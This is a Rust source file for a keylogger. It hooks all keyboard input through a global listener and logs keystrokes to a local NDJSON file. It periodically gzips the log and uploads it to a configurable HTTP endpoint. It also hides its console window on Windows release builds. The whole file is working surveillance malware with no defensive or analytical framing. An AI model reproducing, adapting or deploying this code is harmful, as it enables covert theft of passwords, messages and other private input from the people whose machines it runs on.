#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::{fs::File, io::{BufWriter, Read, Write}};
use flate2::{write::GzEncoder, Compression};
use rdev::{listen, Event};
use reqwest::Client;
use tokio::{select, sync::watch};
use std::sync::{Arc, Mutex};
use clap::Parser;
use crate::keylog::{KeyAggregator, KeylogEntry};

mod keylog;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Upload endpoint URL
    #[arg(short, long, default_value = "http://127.0.0.1:8080/api/upload")]
    url: String,

    /// Output file path (without .current suffix)
    #[arg(short, long, default_value = "keylog.ndjson")]
    output: String,

    /// Upload interval in seconds
    #[arg(short, long, default_value_t = 60)]
    interval: u64,

    /// Logger NDJSON save interval in milliseconds
    #[arg(short, long, default_value_t = 60000)]
    logger_interval: u64,

    /// Enable debug mode with periodic uploads
    #[arg(short, long, default_value_t = false)]
    debug: bool,
}


fn append_entry<W>(
    writer: &mut W,
    entry: &KeylogEntry,
) -> std::io::Result<()>
where
    W: Write
{
    let value = serde_json::to_string(&entry)?;
    writer.write_all(format!("{}\n", value).as_bytes())?;
    Ok(())
}

fn create_callback(
    logger_interval: std::time::Duration,
    mut writer: BufWriter<File>,
    flush_signal: Arc<Mutex<bool>>
) -> Box<dyn FnMut(Event) + Send> {
    let mut aggregator = KeyAggregator::new(logger_interval);

    let cb = move |event: Event| {
        if let Some(entry) = aggregator.process_event(event) {
            if let Err(e) = append_entry(&mut writer, &entry) {
                eprintln!("Failed to write to file: {}", e);
            }

            if let Err(e) = writer.flush() {
                eprintln!("Failed to flush file: {}", e);
            }

            if let Ok(mut signal) = flush_signal.lock() {
                *signal = true;
            }
        }
    };

    Box::new(cb)
}

fn gzip_file_to_vec(path: &str) -> anyhow::Result<Vec<u8>> {
    let mut input = File::open(path)?;
    let mut buf = Vec::new();

    input.read_to_end(&mut buf)?;

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&buf)?;
    let compressed = encoder.finish()?;
    Ok(compressed)
}

async fn upload_keylog(
    url: &str,
    path: &str,
) -> anyhow::Result<()> {
    let compressed = gzip_file_to_vec(path)?;

    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::bytes(compressed)
            .file_name("keylog.ndjson.gz")
            .mime_str("application/gzip")?);

    let response = Client::new()
        .post(url)
        .multipart(form)
        .send()
        .await?;

    if !response.status().is_success() {
        return Err(anyhow::anyhow!(
            "Failed to upload file: {}",
            response.status()
        ));
    }
    Ok(())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    let current_file = format!("{}.current", args.output);
    let file = File::options()
        .create(true)
        .append(true)
        .open(&current_file)?;
    let writer = BufWriter::new(file);

    println!("Keylogger started");
    println!("Output file: {}", current_file);
    if args.debug {
        println!("Debug mode: enabled");
        println!("Upload URL: {}", args.url);
        println!("Upload interval: {} seconds", args.interval);
        println!("Logger interval: {} ms", args.logger_interval);
    }

    let flush_signal = Arc::new(Mutex::new(false));
    let callback = create_callback(
        std::time::Duration::from_millis(args.logger_interval), 
        writer, 
        flush_signal.clone()
    );
    let (stop_tx, mut stop_rx) = watch::channel(false);

    if args.debug {
        let url = args.url.clone();
        let path = args.output.clone();
        let current_file_clone = current_file.clone();

        let send_thread = tokio::spawn(async move {
            let mut tick = tokio::time::interval(std::time::Duration::from_secs(args.interval));

            loop {
                select! {
                    _ = tick.tick() => {
                        let should_upload = if let Ok(mut signal) = flush_signal.lock() {
                            let should = *signal
                                && std::path::Path::new(&current_file_clone)
                                    .metadata()
                                    .map(|m| m.len())
                                    .unwrap_or(0)
                                    > 0;
                            *signal = false;
                            should
                        } else {
                            false
                        };

                        if should_upload {
                            println!("Preparing to upload keylog...");
                            if let Err(e) = std::fs::copy(&current_file_clone, &path) {
                                eprintln!("Failed to copy current file: {}", e);
                            } else if let Err(error) = upload_keylog(&url, &path).await {
                                eprintln!("Upload error: {:?}", error);
                            }
                        }
                    }
                    _ = stop_rx.changed() => {
                        if *stop_rx.borrow() {
                            println!("Stopping upload thread...");
                            break;
                        }
                    }
                }
            }
        });

        if let Err(error) = listen(callback) {
            eprintln!("Listen error: {:?}", error);
        }
        stop_tx.send(true)?;
        send_thread.await?;
    } else if let Err(error) = listen(callback) {
        eprintln!("Listen error: {:?}", error);
    }

    println!("Keylogger stopped");
    Ok(())
}
